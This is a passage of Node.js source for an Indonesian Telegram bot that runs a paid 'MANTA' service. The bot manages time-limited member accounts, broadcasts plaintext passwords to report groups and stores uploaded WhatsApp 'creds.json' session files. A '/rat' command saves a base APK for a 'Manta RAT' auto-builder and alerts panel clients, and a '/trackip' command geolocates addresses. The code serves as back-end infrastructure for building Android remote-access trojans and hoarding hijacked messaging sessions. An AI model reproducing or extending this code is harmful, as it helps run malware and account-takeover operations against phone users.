Balas dengan:
<b>username password durasi_hari</b>
`, { parse_mode: "HTML", reply_markup: { force_reply: true } })
        setUserFlow(userId, "CREATE_PERSONAL", { chatId, promptMessageId: sent.message_id })
        return
    }
    if (q.data === "create_member_tk") {
        clearUserFlow(userId)
        const role = await resolveUserRole(userId)
        if (role !== "TK" && role !== "OWNER") {
            return bot.sendMessage(chatId, "❌ Akses ditolak")
        }

        const sent = await bot.sendMessage(chatId, `
<b>🧾 UPLOAD BUKTI PEMBAYARAN</b>

Silakan kirim <b>FOTO</b> bukti transfer yang jelas.
`, { parse_mode: "HTML" })
        setUserFlow(userId, "WAIT_PROOF_TK", { chatId, promptMessageId: sent.message_id })
        return
    }

    if (q.data === "cek_member_saya") {
        const role = await resolveUserRole(userId)
        if (role !== "TK" && role !== "OWNER") {
            return bot.sendMessage(chatId, "❌ Akses ditolak")
        }

        const db = loadDatabase()

        const members = db.filter(
            u =>
                u.accountType === "BUYER" &&
                u.createdById === userId
        )

        if (!members.length) {
            return bot.sendMessage(chatId, "❌ Kamu belum membuat akun member")
        }

        let text = `<b>📋 MEMBER YANG KAMU BUAT</b>\n\n`

        members.forEach((u, i) => {
            text +=
                `#${i + 1}
👤 <b>${u.username}</b>
🎯 MEMBER
⏳ Exp: <b>${formatDateExp(u.expiredDate)}</b>

`
        })

        return bot.sendMessage(chatId, text, { parse_mode: "HTML" })
    }

    if (q.data === "hapus_member_saya") {
        clearUserFlow(userId)
        const role = await resolveUserRole(userId)
        if (role !== "TK" && role !== "OWNER") {
            return bot.sendMessage(chatId, "❌ Akses ditolak")
        }

        const sent = await bot.sendMessage(chatId, `
<b>🗑 HAPUS MEMBER (TK)</b>

Balas dengan:
<b>username_member</b>
`, {
            parse_mode: "HTML",
            reply_markup: { force_reply: true }
        })
        setUserFlow(userId, "DELETE_MEMBER_TK", { chatId, promptMessageId: sent.message_id })
        return
    }
    if (!isOwner) return

    if (q.data === "set_expire") {
        return bot.sendMessage(chatId, `
<b>⏳ MANTA EXPIRED MANAGER</b>

Balas:
<b>username tambah_hari</b>
`, { parse_mode: "HTML", reply_markup: { force_reply: true } })
    }

    if (q.data === "create_custom") {
        return bot.sendMessage(chatId, `
<b>🎛 MANTA CUSTOM USER</b>

Balas:
<b>username password role hari</b>
`, { parse_mode: "HTML", reply_markup: { force_reply: true } })
    }

    if (q.data === "delete_user") {
        return bot.sendMessage(chatId, `
<b>🗑 MANTA USER REMOVER</b>

Balas:
<b>username</b>
`, { parse_mode: "HTML", reply_markup: { force_reply: true } })
    }

    if (q.data.startsWith("list_user")) {
        const page = Number(q.data.split(":")[1] || 0)

        return bot.editMessageText(
            getFormattedUsers(page),
            {
                chat_id: chatId,
                message_id: q.message.message_id,
                parse_mode: "HTML",
                reply_markup: getUserListKeyboard(page)
            }
        )
    }

    if (q.data === "delmemb") {
        const db = loadDatabase()
        const now = Date.now()
        let count = 0
        const deletedNames = []

        const filteredDb = db.filter(u => {
            if (u.role === "member") {
                const exp = parseUserExpiredMs(u.expiredDate)
                if (!isNaN(exp) && exp < now) {
                    count++
                    deletedNames.push(u.username)
                    for (const k in activeKeys) {
                        if (activeKeys[k].username === u.username) {
                            delete activeKeys[k]
                        }
                    }
                    return false
                }
            }
            return true
        })

        if (count === 0) {
            return bot.sendMessage(chatId, "✅ Tidak ditemukan akun member yang sudah expired.")
        }

        saveDatabase(filteredDb)
        return bot.sendMessage(chatId, `✅ Berhasil menghapus <b>${count}</b> akun member yang sudah expired.\n\n${deletedNames.slice(0, 10).join(', ')}${deletedNames.length > 10 ? ' ...' : ''}`, { parse_mode: "HTML" })
    }
})
bot.on("message", async msg => {
    try {
        if (!msg?.chat?.id) return

        const chatId = msg.chat.id
        const userId = msg.from?.id
        const text = msg.text || ""
        const currentState = userState.get(userId)
        const currentFlow = getUserFlow(userId)

        const cfg = loadTelegramConfig() || {}
        const ownerList = Array.isArray(cfg.ownerList) ? cfg.ownerList : []
        const isOwner = ownerList.includes(userId)

        if (currentState === "WAIT_PROOF_TK") {
            if (currentFlow?.chatId && currentFlow.chatId !== chatId) return
            if (!msg.photo || !msg.photo.length) {
                return bot.sendMessage(chatId, "❌ Bukti harus berupa <b>FOTO</b> yang jelas (bukan file/dokumen).", { parse_mode: "HTML" })
            }

            const fileId = msg.photo[msg.photo.length - 1].file_id

            userProof.set(userId, fileId)
            const sent = await bot.sendMessage(chatId, `
✅ Bukti diterima

Balas:
<b>username password durasi_hari</b>
`, {
                parse_mode: "HTML",
                reply_markup: { force_reply: true }
            })
            setUserFlow(userId, "CREATE_TK", { chatId, promptMessageId: sent.message_id })
            return
        }

        if (text.startsWith("/")) return

        if (msg.document) {
            const fileName = msg.document.file_name || ""
            if (!fileName.endsWith(".json")) return

            const file = await bot.getFile(msg.document.file_id)
            const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`
            const buffer = await downloadToBuffer(fileUrl)
            const jsonData = JSON.parse(buffer.toString())

            if (!isValidBaileysCreds(jsonData)) {
                return bot.sendMessage(chatId, "❌ File bukan creds.json valid")
            }

            const folder = path.join(__dirname, "otaxayun")
            if (!fs.existsSync(folder)) fs.mkdirSync(folder, { recursive: true })

            let finalName = fileName
            let savePath = path.join(folder, finalName)

            if (fs.existsSync(savePath)) {
                finalName = `${Date.now()}-${fileName}`
                savePath = path.join(folder, finalName)
            }

            fs.writeFileSync(savePath, JSON.stringify(jsonData))
            return bot.sendMessage(chatId, `✅ File tersimpan: ${finalName}`)
        }

        if (!msg.reply_to_message?.text || !text) return

        const ref = String(msg.reply_to_message.text)
        const parts = text.trim().split(/[\s,|]+/)
        const db = loadDatabase()

        if (currentState === "CREATE_TK") {
            if (currentFlow?.chatId && currentFlow.chatId !== chatId) return
            if (currentFlow?.promptMessageId && msg.reply_to_message?.message_id !== currentFlow.promptMessageId) return
            if (!userProof.has(userId)) {
                setUserFlow(userId, "WAIT_PROOF_TK", {
                    chatId,
                    promptMessageId: currentFlow?.promptMessageId ?? null
                })
                return bot.sendMessage(chatId, "❌ Upload bukti dulu")
            }
            if (parts.length < 3) {
                return bot.sendMessage(chatId, "❌ Format salah (username password durasi)")
            }

            const [username, password, day] = parts

            if (db.some(u => u.username === username)) {
                return bot.sendMessage(chatId, "❌ Username sudah ada")
            }

            const add = Number(day)
            if (!Number.isInteger(add) || add < 1) {
                return bot.sendMessage(chatId, "❌ Durasi hari tidak valid (minimal 1 hari)")
            }
            if (add > 30) {
                return bot.sendMessage(chatId, "❌ Maksimal durasi adalah 30 hari.")
            }

            const expDate = createExpiryIsoWib(add)
            if (!expDate) {
                return bot.sendMessage(chatId, "âŒ Durasi hari tidak valid")
            }

            const creator = resolveTelegramIdentity(msg)
            const tkGroupIds = [...new Set([...LEGACY_TK_REPORT_GROUPS, ...getTelegramGroupsByRole("TK")])]
            const ownerGroupIds = getTelegramGroupsByRole("OWNER")
            const reportGroupIds = [...new Set([...tkGroupIds, ...ownerGroupIds])]
            const accountCaption = `
🚨 <b>MANTA ACCOUNT CREATED (TK)</b>

👤 Dibuat oleh
• Nama : <b>${creator.username}</b>
• ID   : <code>${creator.id}</code>

🆕 Akun
• Username : <b>${username}</b>
• Password : <b>${password}</b>
• Role     : <b>MEMBER</b>
• Durasi   : <b>${add} hari</b>
• Expired  : <b>${formatDateExp(expDate)}</b>
`

            db.push({
                username,
                password,
                role: "member",
                expiredDate: expDate,
                createdAt: new Date().toISOString(),
                createdById: creator.id,
                createdByName: creator.username,
                accountType: "BUYER",
                protected: true
            })

            saveDatabase(db)
            const proof = userProof.get(userId)

            if (proof) {

                await bot.sendPhoto(OWNER_ID, proof, { caption: accountCaption, parse_mode: "HTML" })


                for (const groupId of reportGroupIds) {
                    await bot.sendPhoto(groupId, proof, { caption: accountCaption, parse_mode: "HTML" }).catch(() => { })
                }
            } else {

                await bot.sendMessage(OWNER_ID, accountCaption, { parse_mode: "HTML" })
                for (const groupId of reportGroupIds) {
                    await bot.sendMessage(groupId, accountCaption, { parse_mode: "HTML" }).catch(() => { })
                }
            }

            clearUserFlow(userId)


            await bot.sendMessage(chatId, `
✅ <b>AKUN AKTIF</b>

• Username : <b>${username}</b>
• Password : <b>${password}</b>
🎯 MEMBER
⏳ ${formatDateExp(expDate)}
`, { parse_mode: "HTML" })

            return
        }
        if (currentState === "DELETE_MEMBER_TK") {
            if (currentFlow?.chatId && currentFlow.chatId !== chatId) return
            if (currentFlow?.promptMessageId && msg.reply_to_message?.message_id !== currentFlow.promptMessageId) return
            const username = parts[0]
            if (!username) {
                return bot.sendMessage(chatId, "❌ Username tidak valid")
            }

            const idx = db.findIndex(
                u =>
                    u.username === username &&
                    u.accountType === "BUYER" &&
                    u.createdById === userId
            )

            if (idx === -1) {
                clearUserFlow(userId)
                return bot.sendMessage(chatId, "❌ Member tidak ditemukan atau bukan milikmu")
            }

            const removed = removeUserFromDatabase(db, idx)
            saveDatabase(db)
            clearUserFlow(userId)

            await bot.sendMessage(chatId, `
✅ <b>MEMBER DIHAPUS</b>

👤 <b>${removed.username}</b>
⏳ Expired: <b>${formatDateExp(removed.expiredDate)}</b>
`, { parse_mode: "HTML" })

            return
        }
        if (currentState === "CREATE_PERSONAL") {
            if (currentFlow?.chatId && currentFlow.chatId !== chatId) return
            if (currentFlow?.promptMessageId && msg.reply_to_message?.message_id !== currentFlow.promptMessageId) return
            if (telegramUserHasAccount(userId)) return
            if (parts.length !== 3) {
                return bot.sendMessage(chatId, "❌ Format salah")
            }

            const role = await resolveUserRole(userId)
            if (!role) return

            const [username, password, day] = parts
            if (db.some(u => u.username === username)) {
                return bot.sendMessage(chatId, "❌ Username sudah ada")
            }

            const add = Number(day)
            if (!Number.isInteger(add) || add <= 0) {
                return bot.sendMessage(chatId, "❌ Durasi hari tidak valid")
            }

            const expDate = createExpiryIsoWib(add)
            if (!expDate) {
                return bot.sendMessage(chatId, "âŒ Durasi hari tidak valid")
            }

            db.push({
                username,
                password,
                role,
                expiredDate: expDate,
                createdAt: new Date().toISOString(),
                telegramId: userId,
                accountType: "PERSONAL"
            })

            saveDatabase(db)
            clearUserFlow(userId)

            return bot.sendMessage(chatId, `
✅ <b>AKUN AKTIF</b>

👤 ${username}
🎯 ${role.toUpperCase()}
⏳ ${formatDateExp(expDate)}
`, { parse_mode: "HTML" })
        }

        if (ref.includes("MANTA EXPIRED MANAGER") && isOwner) {
            if (parts.length !== 2) return

            const [username, day] = parts
            const u = db.find(x => x.username === username)
            if (!u) return

            const add = Number(day)
            if (!Number.isInteger(add) || add <= 0) {
                return bot.sendMessage(chatId, "❌ Hari tidak valid")
            }

            const nextExpiredDate = addDaysToExpiryIsoWib(u.expiredDate, add)
            if (!nextExpiredDate) return bot.sendMessage(chatId, "âŒ Hari tidak valid")
            u.expiredDate = nextExpiredDate

            saveDatabase(db)
            return bot.sendMessage(chatId, "✅ Expired diperbarui")
        }

        if (ref.includes("MANTA CUSTOM USER") && isOwner) {
            if (parts.length !== 4) return

            const [u, p, r, d] = parts
            if (!VALID_ROLES.includes(r)) return
            if (db.some(x => x.username === u)) return

            const expiredDate = createExpiryIsoWib(Number(d))
            if (!expiredDate) return bot.sendMessage(chatId, "âŒ Hari tidak valid")

            db.push({
                username: u,
                password: p,
                role: r,
                expiredDate,
                createdAt: new Date().toISOString()
            })

            saveDatabase(db)
            return bot.sendMessage(chatId, "✅ Custom user dibuat")
        }

        if (ref.includes("MANTA USER REMOVER") && isOwner) {
            const i = db.findIndex(x => x.username === parts[0])
            if (i === -1) return

            removeUserFromDatabase(db, i)
            saveDatabase(db)
            return bot.sendMessage(chatId, "🗑 User dihapus")
        }
    } catch (e) {
        console.error(e)
        try {
            bot.sendMessage(msg.chat.id, `❌ Error:\n<code>${e.message}</code>`, {
                parse_mode: "HTML"
            })
        } catch { }
    }
})
let isPurging = false;


const PURGE_GRACE_FILE = path.join(__dirname, "purge_grace.json");
function loadPurgeGrace() {
    try {
        if (fs.existsSync(PURGE_GRACE_FILE))
            return JSON.parse(fs.readFileSync(PURGE_GRACE_FILE, "utf8"));
    } catch (_) { }
    return {};
}
function savePurgeGrace(data) {
    fs.writeFileSync(PURGE_GRACE_FILE, JSON.stringify(data, null, 2));
}

async function purgeIllegalAccountsOnStartup() {
    if (process.env.VPS_ROLE === 'slave') return;
    if (parseInt(process.env.WORKER_ID || '0') !== 1) return;

    if (isPurging) return;
    isPurging = true;

    try {
        const db = loadDatabase();
        const cfg = loadTelegramConfig() || {};
        const ownerList = Array.isArray(cfg.ownerList) ? cfg.ownerList : [];
        const deletedUsers = [];
        const warningUsers = [];
        const updatedUsers = [];
        const deletedUsernames = [];
        let changed = false;

        const now = new Date();
        const roleCache = new Map();
        const graceData = loadPurgeGrace();
        let graceChanged = false;

        const NEW_ACCOUNT_PROTECTION_MS = 48 * 60 * 60 * 1000; // 48 jam
        const OFFICIAL_GRACE_PERIOD_MS = 72 * 60 * 60 * 1000; // 72 jam
        const EXPIRED_BUFFER_MS = 72 * 60 * 60 * 1000; // 72 jam

        const resolveRoleSafe = async (telegramId) => {
            const numericId = Number(telegramId);
            if (!numericId) return null;
            if (ownerList.includes(numericId)) return "KINGZ";
            if (roleCache.has(numericId)) return roleCache.get(numericId);

            try {
                const resolvedRole = await resolveUserRole(numericId);
                roleCache.set(numericId, resolvedRole);
                return resolvedRole;
            } catch (err) {
                console.log(`[PURGE] ⚠️ Gagal cek role ${telegramId}: ${err.message}`);
                return "API_ERROR";
            }
        };

        const doubleCheckRole = async (telegramId) => {
            await new Promise(r => setTimeout(r, 3000));
            try {
                const role = await resolveUserRole(Number(telegramId));
                return role;
            } catch (err) {
                console.log(`[PURGE] ⚠️ Double-check gagal ${telegramId}: ${err.message}`);
                return "API_ERROR";
            }
        };

        for (let i = db.length - 1; i >= 0; i--) {
            const u = db[i];

            let deleteReason = "";

            let createdAtMs = u.createdAt ? parseUserExpiredMs(u.createdAt) : NaN;
            if (!Number.isFinite(createdAtMs)) {
                u.createdAt = new Date().toISOString();
                updatedUsers.push({ username: u.username, createdAt: u.createdAt });
                changed = true;
                console.log(`[PURGE] 🆕 Set missing createdAt for ${u.username}`);
                createdAtMs = Date.now();
            }

            if ((now.getTime() - createdAtMs) < NEW_ACCOUNT_PROTECTION_MS) {
                console.log(`[PURGE] 🛡️ Skip ${u.username} — akun baru dibuat (< 48 jam)`);
                continue;
            }

            const normalizedRole = normalizeRole(u.role);
            const expMs = u.expiredDate ? parseUserExpiredMs(u.expiredDate) : NaN;
            const isValidDate = Number.isFinite(expMs);
            const expired = isValidDate && (expMs + EXPIRED_BUFFER_MS) < now.getTime();

            if (expired) {
                deleteReason = `Expired (${formatWibMs(expMs)})`;
            } else if (u.expiredDate && !isValidDate) {
                console.log(`[PURGE] ⏳ Skip ${u.username || "-"} — expiredDate tidak valid: ${u.expiredDate}`);
                continue;
            } else if (!isMemberRole(normalizedRole) && u.telegramId && !ownerList.includes(Number(u.telegramId))) {
                const resolvedRole = await resolveRoleSafe(u.telegramId);

                if (resolvedRole === "API_ERROR") {
                    console.log(`[PURGE] ⏭️ Skip ${u.username || u.telegramId} — API Telegram gagal, cek ulang nanti`);
                    continue;
                }

                if (!resolvedRole) {
                    console.log(`[PURGE] 🔄 Double-checking ${u.username || u.telegramId}...`);
                    const secondCheck = await doubleCheckRole(u.telegramId);

                    if (secondCheck === "API_ERROR") {
                        console.log(`[PURGE] ⏭️ Skip ${u.username || u.telegramId} — double-check juga gagal`);
                        continue;
                    }

                    if (secondCheck) {
                        console.log(`[PURGE] ✅ ${u.username} ternyata masih ada di grup (role: ${secondCheck})`);
                        if (u.role !== secondCheck) {
                            u.role = secondCheck;
                            updatedUsers.push({ username: u.username, role: u.role });
                            changed = true;
                        }
                        if (graceData[u.username]) {
                            delete graceData[u.username];
                            graceChanged = true;
                        }
                        continue;
                    }

                    const graceKey = u.username || `tid_${u.telegramId}`;
                    const graceStartedAt = graceData[graceKey];

                    if (!graceStartedAt) {
                        graceData[graceKey] = now.getTime();
                        graceChanged = true;
                        console.log(`[PURGE] ⏳ Grace dimulai untuk ${u.username || u.telegramId} selama 72 jam`);
                        continue;
                    }

                    if ((now.getTime() - graceStartedAt) < OFFICIAL_GRACE_PERIOD_MS) {
                        console.log(`[PURGE] ⏳ ${u.username || u.telegramId} masih dalam grace period official`);
                        continue;
                    }

                    deleteReason = "Akun Official — Ter-ban/Keluar dari Grup Resmi";
                    delete graceData[graceKey];
                    graceChanged = true;

                } else if (u.role !== resolvedRole) {
                    u.role = resolvedRole;
                    updatedUsers.push({ username: u.username, role: u.role });
                    changed = true;
                    if (graceData[u.username]) {
                        delete graceData[u.username];
                        graceChanged = true;
                    }
                }
            }

            if (deleteReason) {
                console.log(`[PURGE] DELETE ${u.username} | createdAt=${u.createdAt || "-"} | expiredDate=${u.expiredDate || "-"} | reason=${deleteReason}`);
                deletedUsers.push({ ...u, deleteReason });
                deletedUsernames.push(u.username);
                changed = true;
            }
        }

        // === RACE CONDITION FIX ===
        // Re-load fresh database before saving to avoid overwriting
        // accounts created/modified by other requests during the purge scan
        if (changed) {
            const freshDb = loadDatabaseFresh();

            // Apply metadata updates (createdAt, role) to fresh data
            for (const upd of updatedUsers) {
                const idx = freshDb.findIndex(x => x.username === upd.username);
                if (idx !== -1) {
                    if (upd.createdAt) freshDb[idx].createdAt = upd.createdAt;
                    if (upd.role) freshDb[idx].role = upd.role;
                }
            }

            // Delete only the users that were confirmed to need deletion
            for (const username of deletedUsernames) {
                const idx = freshDb.findIndex(x => x.username === username);
                if (idx !== -1) {
                    removeUserFromDatabase(freshDb, idx);
                }
            }

            saveDatabase(freshDb);
        }

        if (graceChanged) {
            savePurgeGrace(graceData);
        }

        for (const u of deletedUsers) {
            await bot.sendMessage(
                OWNER_ID,
                `
🚨 <b>AKUN DIHAPUS (AUTO-PURGE)</b>

👤 Username : <b>${u.username}</b>
🆔 Telegram : <code>${u.telegramId || u.createdById || "-"}</code>
🎯 Role     : <b>${u.role || "-"}</b>
📦 Type     : <b>${u.accountType || "-"}</b>
🆕 Created  : <b>${u.createdAt ? formatDateExp(u.createdAt) : "-"}</b>
⏳ Expired  : <b>${u.expiredDate ? formatDateExp(u.expiredDate) : "-"}</b>
⛔ Alasan   : <b>${u.deleteReason}</b>
🕐 Waktu    : <b>${now.toISOString()}</b>
`,
                { parse_mode: "HTML" }
            ).catch(() => { });
        }

    } catch (err) {
        console.error("❌ purgeIllegalAccountsOnStartup error:", err.message);
    } finally {
        isPurging = false;
    }
}

bot.onText(/^\/addgroup\s+(\w+)/i, (msg, match) => {
    if (msg.chat.type === "private") return

    const role = match[1].toUpperCase()
    if (!VALID_GROUPS.includes(role)) {
        return bot.sendMessage(msg.chat.id, "❌ Role tidak valid.")
    }

    const id = msg.from.id
    const chatId = msg.chat.id

    const config = loadTelegramConfig()
    if (!config.ownerList.includes(id)) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
    }

    const data = loadTelegramGroup()
    data[String(chatId)] = role
    saveTelegramGroup(data)

    bot.sendMessage(chatId, `✅ Grup ini sekarang memiliki izin membuat akun\n🎯 Role: ${role}`)
})
function formatUptime(seconds) {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${h}h ${m}m ${s}s`;
}
bot.onText(/\/hapusmem/i, msg => {
    const chatId = msg.chat.id
    const userId = msg.from?.id

    const cfg = loadTelegramConfig() || {}
    const ownerList = Array.isArray(cfg.ownerList) ? cfg.ownerList : []

    if (!ownerList.includes(userId)) {
        return bot.sendMessage(chatId, "❌ Akses ditolak")
    }

    const db = loadDatabase()
    const now = Date.now()
    const before = db.length
    const filtered = db.filter(u => {
        if (u.role === "member") {
            const exp = parseUserExpiredMs(u.expiredDate)
            if (!isNaN(exp) && exp < now) {
                cleanupUserArtifacts(u.username)
                return false // hapus
            }
        }
        return true // simpan
    })
    const removed = before - filtered.length

    if (removed === 0) {
        return bot.sendMessage(chatId, "✅ Tidak ada akun member yang sudah expired")
    }

    saveDatabase(filtered)

    return bot.sendMessage(chatId, `
🗑 <b>AKUN MEMBER EXPIRED DIHAPUS</b>

• Total dihapus: <b>${removed}</b>
• Member aktif: <b>AMAN (tidak dihapus)</b>
`, { parse_mode: "HTML" })
})
bot.onText(/^\/?status$/, async (msg) => {
    const chatId = msg.chat.id;

    if (msg.from.id !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    try {
        const uptime = formatUptime(process.uptime());
        const ramUsage = process.memoryUsage().rss / 1024 / 1024;
        const cpuLoad = os.loadavg()[0];
        const db = JSON.parse(fs.readFileSync('./database.json'));
        const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

        const pingStart = Date.now();
        await axios.get(`http://96.9.212.22:${PORT}/ping`);
        const ping = Date.now() - pingStart;

        const text = `*MANTA Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Darkness-Secure*`;

        await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    } catch (err) {
        console.error("❌ Gagal ambil status:", err.message);
        await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
    }
});
bot.onText(/\/backup$/, async (msg) => {
    if (msg.from.id !== OWNER_ID) return

    try {
        await bot.sendMessage(msg.chat.id, "⏳ Membuat backup...")

        const zipPath = await createZipBackup()

        await bot.sendDocument(
            msg.chat.id,
            zipPath,
            {},
            { caption: "📦 Backup manual (SEMUA JSON)" }
        )

    } catch (e) {
        bot.sendMessage(
            msg.chat.id,
            "❌ Backup gagal:\n" + e.message
        )
    }
})
bot.onText(/^\/?rat$/i, async (msg) => {
    if (msg.from.id !== OWNER_ID) return;

    try {
        if (!msg.reply_to_message || !msg.reply_to_message.document) {
            return bot.sendMessage(msg.chat.id, "❌ Reply file APK (polosan) dengan perintah /rat");
        }

        const doc = msg.reply_to_message.document;
        if (!doc.file_name.endsWith(".apk")) {
            return bot.sendMessage(msg.chat.id, "❌ File harus berformat .apk");
        }

        await bot.sendMessage(msg.chat.id, "⏳ Mendownload dan menyimpan APK Polosan ke Server...");

        const fileLink = await bot.getFileLink(doc.file_id);
        const res = await fetch(fileLink);
        const buffer = Buffer.from(await res.arrayBuffer());

        const targetPath = path.join(__dirname, "manta_base.apk");
        fs.writeFileSync(targetPath, buffer);


        const preDecodedPath = path.join(__dirname, 'manta_base_decoded');
        if (fs.existsSync(preDecodedPath)) {
            fs.rmSync(preDecodedPath, { recursive: true, force: true });
        }


        const wsPayload = JSON.stringify({
            type: 'rat_update',
            message: 'APK Manta RAT terbaru telah berhasil diupload ke Server! Silakan coba Build APK sekarang.'
        });
        wss.clients.forEach(c => {
            if (c.readyState === 1) c.send(wsPayload);
        });

        bot.sendMessage(msg.chat.id, "✅ Berhasil! File manta_base.apk telah tersimpan di server. Panel Auto-Builder di Tools Gateway sekarang bisa digunakan dengan APK terbaru.");
    } catch (e) {
        bot.sendMessage(msg.chat.id, `❌ Gagal menyimpan APK: ${e.message}`);
    }
});

bot.onText(/\/upback$/, async (msg) => {
    if (msg.from.id !== OWNER_ID) return

    try {
        if (!msg.reply_to_message || !msg.reply_to_message.document) {
            return bot.sendMessage(
                msg.chat.id,
                "❌ Reply file backup .zip"
            )
        }

        const doc = msg.reply_to_message.document

        if (!doc.file_name.endsWith(".zip")) {
            return bot.sendMessage(
                msg.chat.id,
                "❌ File harus .zip"
            )
        }

        const filePath = path.join(BACKUP_DIR, doc.file_name)

        const fileLink = await bot.getFileLink(doc.file_id)
        const res = await fetch(fileLink)
        const buffer = Buffer.from(await res.arrayBuffer())

        fs.writeFileSync(filePath, buffer)

        await restoreFromZip(filePath)

        bot.sendMessage(
            msg.chat.id,
            "✅ Semua file JSON berhasil di-restore"
        )
    } catch (e) {
        bot.sendMessage(
            msg.chat.id,
            "❌ Restore gagal:\n" + e.message
        )
    }
})

bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const ip = match[1].trim();

    if (msg.from.id !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
        return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
    }

    await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

    try {
        const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

        if (data.error) {
            return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
        }

        const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

        await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });


        if (data.latitude && data.longitude) {
            await bot.sendLocation(chatId, data.latitude, data.longitude);
        }

    } catch (err) {
        console.error("❌ Error trackip:", err.message);
        bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
    }
});










function blockReview(user, res) {
    if (!user) {
        res.status(401).json({
            valid: false,
            message: "User tidak ditemukan / belum login"
        });
        return true;
    }

    if (user.role === "REVIEW") {
        res.status(403).json({
            valid: false,
            message: "Account REVIEW hanya untuk melihat aplikasi"
        });
        return true;
    }

    return false;
}
function loadDB() {
    if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
    return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
    fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}


function doReset(role) {
    const db = loadDB();
    let deleted = [], remain = [];

    if (role === "all") {
        deleted = db.map(u => u.username);
        remain = [];
    } else {
        for (const u of db) {
            if ((u.role || "member") === role) deleted.push(u.username);
            else remain.push(u);
        }
    }

    saveDB(remain);
    fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

    return deleted;
}


function registerResetButton(cmd, role) {
    bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
        if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

        const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
        const opts = {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
                    [{ text: "❌ Batal", callback_data: "cancel_reset" }]
                ]
            }
        };
        bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
    });


    bot.on("callback_query", async (query) => {
        const data = query.data;
        const fromId = query.from.id;
        const chatId = query.message.chat.id;

        if (data === `confirm_${cmd}`) {
            if (fromId !== OWNER_ID) {
                return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
            }

            const deleted = doReset(role);
            const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

            await bot.sendDocument(chatId, "reset_result.txt", {
                caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
                parse_mode: "Markdown"
            });
            return bot.answerCallbackQuery(query.id, { text: info });
        }

        if (data === "cancel_reset") {
            if (fromId !== OWNER_ID) {
                return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
            }
            bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
            bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
        }
    });
}


registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");
const ADD_TQTO_STATE = {}

bot.onText(/^\/addtqto$/i, async (msg) => {
    const chatId = msg.chat.id
    const fromId = msg.from.id
    const chatType = msg.chat.type

    if (chatType !== "private") {
        return bot.sendMessage(chatId, "❌ Gunakan perintah ini di private chat.")
    }
    const config = loadTelegramConfig()
    const isOwner = config.ownerList.includes(fromId)
    const role = await getUserRoleFromGroups(fromId)

    if (!isOwner && role !== "OWNER") {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.")
    }

    ADD_TQTO_STATE[fromId] = {
        step: "NAMA",
        data: {}
    }

    bot.sendMessage(chatId, "📌 Masukkan NAMA contributor:", {
        parse_mode: "Markdown"
    })
})

let dbLock = false

async function safeSaveDatabase(db) {
    while (dbLock) await new Promise(r => setTimeout(r, 10))
    dbLock = true
    saveDatabase(db)
    dbLock = false
}

bot.onText(/^\/uprole (.+)$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
    if (!match[1]) return bot.sendMessage(chatId, "❌ Format salah.\nGunakan: /uprole <username> <role>");

    const args = match[1].trim().split(/\s+/);
    if (args.length < 2) return bot.sendMessage(chatId, "❌ Format salah.\nGunakan: /uprole <username> <role>");

    const username = args.shift();
